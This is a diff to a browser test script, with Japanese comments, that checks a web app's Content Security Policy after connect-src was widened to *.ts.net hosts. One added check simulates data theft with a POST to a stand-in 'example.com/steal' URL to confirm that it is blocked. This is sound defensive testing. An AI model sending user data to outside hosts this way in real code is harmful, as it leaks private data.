@@ -110,6 +110,37 @@ check("持ち出しが CSP で遮断される", violations.length >= 5, `違反 
 check("外部サーバーに1件も届かない", received.length === 0, received.join(" / ") || "0件");
 check("ページ遷移が起きていない", page.url() === base, page.url());
 
+// connect-src を https://*.ts.net に緩めた。JSDOM は CSP を解釈しないので、
+// 「許可した先には通り、それ以外は通らない」の両方をここでしか確かめられない。
+// ts.net は実在しないホストなので、リクエストを横取りして到達したかどうかだけを見る
+// (横取りは CSP の判定より後に働くため、ブロックされればハンドラは呼ばれない)
+let tsnetReached = false;
+await page.route("https://**.ts.net/**", async (route) => {
+  tsnetReached = true;
+  await route.fulfill({ status: 200, contentType: "application/json", body: '{"ok":true}' });
+});
+const tsnetResult = await page.evaluate(async () => {
+  try {
+    const r = await fetch("https://pc.example-tailnet.ts.net/aubade", {
+      method: "POST",
+      headers: { "Content-Type": "application/json", Authorization: "Bearer x" },
+      body: "{}",
+    });
+    return "status " + r.status;
+  } catch (e) { return "失敗: " + e.message; }
+});
+check("同期先(*.ts.net)へは CSP を通過する", tsnetReached, tsnetResult);
+
+// 深い階層のホスト名でもワイルドカードが効くこと。ここが効かないと
+// machine.tailnet.ts.net 形式の実際の宛先に届かない
+check("ワイルドカードが machine.tailnet.ts.net 形式に効く", tsnetResult.startsWith("status 200"), tsnetResult);
+
+const otherHostBlocked = await page.evaluate(async () => {
+  try { await fetch("https://example.com/steal", { method: "POST", body: "x" }); return "通ってしまった"; }
+  catch (e) { return "遮断: " + e.name; }
+});
+check("同期先以外のホストは依然として遮断される", otherHostBlocked.startsWith("遮断"), otherHostBlocked);
+
 // Service Worker はここでしか検証できない。JSDOM は実装を持たず、CSP の worker-src も解釈しない
 const swState = await page.evaluate(async () => {
   if (!("serviceWorker" in navigator)) return "APIなし";
